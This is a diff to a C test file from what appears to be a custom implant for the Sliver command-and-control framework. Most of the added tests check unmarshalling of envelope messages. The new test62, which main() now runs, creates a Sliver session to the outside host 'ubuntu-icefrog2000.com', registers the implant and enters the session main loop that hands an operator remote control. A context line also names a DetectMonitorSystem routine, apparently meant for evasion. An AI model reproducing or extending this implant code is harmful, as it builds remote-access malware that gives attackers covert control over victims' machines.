@@ -886,7 +886,7 @@ void test48() {
 
 	HttpConfig.dwNumberOfAttemps = 10;
 	pHttpClient = HttpClientInit(pUri, HttpConfig.pProxyConfig);
-	pResp = SendHttpRequest(&HttpConfig, pHttpClient, GET, NULL, NULL, 0, FALSE, TRUE);
+	pResp = SendHttpRequest(&HttpConfig, pHttpClient, NULL, GET, NULL, NULL, 0, FALSE, TRUE);
 	if (pResp == NULL) {
 		goto CLEANUP;
 	}
@@ -1058,7 +1058,97 @@ void test58() {
 	ElementList[7]->SubElements[0]->Type = RepeatedBytes;
 	ElementList[7]->SubElements[0]->dwFieldIdx = 1;
 	ElementList[7]->dwNumberOfSubElement = 1;
-	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshalledData);
+	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshalledData, sizeof(MarshalledData), NULL);
+}
+
+void test59() {
+	BYTE MarshalledData[] = { 8, 128, 133, 255, 240, 159, 161, 182, 185, 245, 1, 16, 11, 26, 51, 10, 2, 67, 58, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 48, 48, 50, 100, 56, 102, 54, 97, 45, 100, 98, 51, 55, 45, 52, 99, 97, 50, 45, 98, 102, 101, 57, 45, 55, 98, 56, 101, 50, 97, 55, 100, 102, 49, 98, 102 };
+	PPBElement ElementList[4];
+	DWORD i = 0;
+	PENVELOPE pResult = NULL;
+
+	for (i = 0; i < _countof(ElementList); i++) {
+		ElementList[i] = ALLOC(sizeof(PBElement));
+		ElementList[i]->dwFieldIdx = i + 1;
+	}
+
+	ElementList[0]->Type = Varint;
+	ElementList[1]->Type = Varint;
+	ElementList[2]->Type = Bytes;
+	ElementList[3]->Type = Varint;
+	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshalledData, sizeof(MarshalledData), NULL);
+	printf("pResult->uID: 0x%08llx\n", pResult->uID);
+	printf("pResult->uType: 0x%08llx\n", pResult->uType);
+	HexDump(pResult->pData->pBuffer, pResult->pData->cbBuffer);
+	printf("pResult->UnknownMessageType: 0x%08llx", pResult->uUnknownMessageType);
+}
+
+void test60() {
+	BYTE MarshalledData[] = { 10, 2, 67, 58, 74, 45, 16, 255, 175, 157, 194, 223, 1, 74, 36, 101, 101, 102, 54, 100, 48, 52, 54, 45, 53, 97, 49, 99, 45, 52, 53, 99, 51, 45, 98, 52, 99, 53, 45, 97, 51, 55, 100, 50, 98, 49, 55, 97, 57, 54, 56 };
+	PPBElement ElementList[2];
+	DWORD i = 0;
+	PBYTE pResult = NULL;
+
+	for (i = 0; i < _countof(ElementList); i++) {
+		ElementList[i] = ALLOC(sizeof(PBElement));
+	}
+
+	ElementList[0]->dwFieldIdx = 1;
+	ElementList[0]->Type = Bytes;
+	ElementList[1]->dwFieldIdx = 9;
+	ElementList[1]->Type = StructType;
+	ElementList[1]->dwNumberOfSubElement = 4;
+	ElementList[1]->SubElements = ALLOC(sizeof(PPBElement) * ElementList[1]->dwNumberOfSubElement);
+	for (i = 0; i < ElementList[1]->dwNumberOfSubElement; i++) {
+		ElementList[1]->SubElements[i] = ALLOC(sizeof(PBElement));
+		ElementList[1]->SubElements[i]->dwFieldIdx = i + 1;
+	}
+
+	ElementList[1]->SubElements[2]->dwFieldIdx = 8;
+	ElementList[1]->SubElements[3]->dwFieldIdx = 9;
+
+	ElementList[1]->SubElements[0]->Type = Varint;
+	ElementList[1]->SubElements[1]->Type = Varint;
+	ElementList[1]->SubElements[2]->Type = Bytes;
+	ElementList[1]->SubElements[3]->Type = Bytes;
+
+	pResult = UnmarshalStruct(ElementList, _countof(ElementList), MarshalledData, sizeof(MarshalledData), NULL);
+}
+
+void test61() {
+	printf("%d\n", GetCurrentProcessorNumber());
+}
+
+void test62() {
+	PSLIVER_HTTP_CLIENT pSliverClient = NULL;
+	PBYTE pMarshalledRegisterInfo = NULL;
+	DWORD cbMarshalledRegisterInfo = 0;
+	PENVELOPE pRegisterEnvelope = NULL;
+
+	pSliverClient = SliverSessionInit("https://ubuntu-icefrog2000.com");
+	if (pSliverClient == NULL) {
+		wprintf(L"SliverHttpClientInit failed");
+		goto CLEANUP;
+	}
+
+	//pSliverClient->szSessionID
+	pMarshalledRegisterInfo = RegisterSliver(pSliverClient, &cbMarshalledRegisterInfo);
+	if (pMarshalledRegisterInfo == NULL) {
+		wprintf(L"RegisterSliver failed");
+		goto CLEANUP;
+	}
+
+	pRegisterEnvelope = ALLOC(sizeof(ENVELOPE));
+	pRegisterEnvelope->uType = MsgRegister;
+	pRegisterEnvelope->pData = ALLOC(sizeof(BUFFER));
+	pRegisterEnvelope->pData->pBuffer = pMarshalledRegisterInfo;
+	pRegisterEnvelope->pData->cbBuffer = cbMarshalledRegisterInfo;
+	WriteEnvelope(pSliverClient, pRegisterEnvelope);
+	SessionMainLoop(pSliverClient);
+CLEANUP:
+	FreeEnvelope(pRegisterEnvelope);
+	FreeSliverHttpClient(pSliverClient);
+	return;
 }
 
 VOID DetectMonitorSystem() {
@@ -1146,6 +1236,10 @@ int main() {
 	//test55();
 	//test56();
 	//test57();
-	test58();
+	//test58();
+	//test59();
+	//test60();
+	//test61();
+	test62();
 	return 0;
 }
